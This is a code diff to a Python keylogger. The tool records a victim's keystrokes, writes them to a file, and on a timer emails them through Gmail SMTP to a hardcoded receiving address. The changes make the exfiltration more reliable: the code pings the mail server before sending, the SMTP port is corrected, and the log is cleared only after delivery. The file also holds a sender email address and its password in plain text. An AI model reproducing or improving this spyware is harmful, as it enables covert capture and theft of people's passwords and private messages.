@@ -11,12 +11,14 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import os
 
 # for measuring dates and timers
 from threading import Timer
 from datetime import datetime
 
 # static variables
+
 EMAIL = "keypoggers@gmail.com"
 EMAILPASS = "ZDSBNJKHF!62ukzhgkuyfwuS@D%@!3ndhvgwe"
 SECINDAY = 86400
@@ -24,9 +26,11 @@ EMAILRECIVE = "keypogreciver@gmail.com"
 LOGGING = True
 
 
+
 class KeyLogger:
     def __init__(self, interval):
         self.interval = interval
+        self.filename = "keylog"
         # the string that logs keystrokes
         self.log = ""
         # records date and time of starting and ending
@@ -48,13 +52,12 @@ class KeyLogger:
                 # self.log = self.log[:-1]
         name = name.replace("Key.", "")
         name = name.replace("\'", "")
-        print(name)  # testing purposes
         self.log += name
-        print(self.log)  # testing purposes
-
-    def naming(self):
-        startdatestr = str(self.startDate)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = "keylog-"+str(startdatestr)
+        # print(self.log)  # testing purposes
+# naming was causing problems
+#    def naming(self):
+#        startdatestr = str(self.startDate)[:-7].replace(" ", "-").replace(":", "")
+#        self.filename = "keylog-"+str(startdatestr)
 
     def carrierpidgeon(self, email, password, reciver, logstr, subject):
         # subject will act as the subject and file name to keep code more simple
@@ -77,18 +80,25 @@ class KeyLogger:
         payload.add_header('Content-Decomposition', 'attachment', filename=subject)
         mime.attach(payload)
 
-        # connect to mail server
-        server = smtplib.SMTP(host="smtp.gmail.com", port=2525)
-        server.starttls()
-        # logging in
-        server.login(email, password)
-        text = mime.as_string()
-        server.sendmail(email, reciver, text)
-        server.quit()
+        # pings server if respoinse comes back it sends email(had issues with code trying to send when internet down)
+        hostname = "smtp.gmail.com"
+        response = os.system("ping -c 1 " + hostname)
+        # and then check the response
+        if response == 0:
+            # print(hostname, 'is up!')
+            # connect to mail server
+            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+            server.starttls()
+            # logging in
+            server.login(email, password)
+            text = mime.as_string()
+            server.sendmail(email, reciver, text)
+            server.quit()
+            self.log = ""
 
     def report(self):
         f = open(str(self.filename) + ".txt", 'w')
-        self.naming()
+        # self.naming()
         if self.log:
             try:
                 f.write(self.log)
@@ -97,7 +107,6 @@ class KeyLogger:
                 try:
                     self.carrierpidgeon(EMAIL, EMAILPASS, EMAILRECIVE, self.log, self.filename)
                 finally:
-                    self.log = ""
                     self.startDate = datetime.now()
 
         timer = Timer(interval=self.interval, function=self.report)
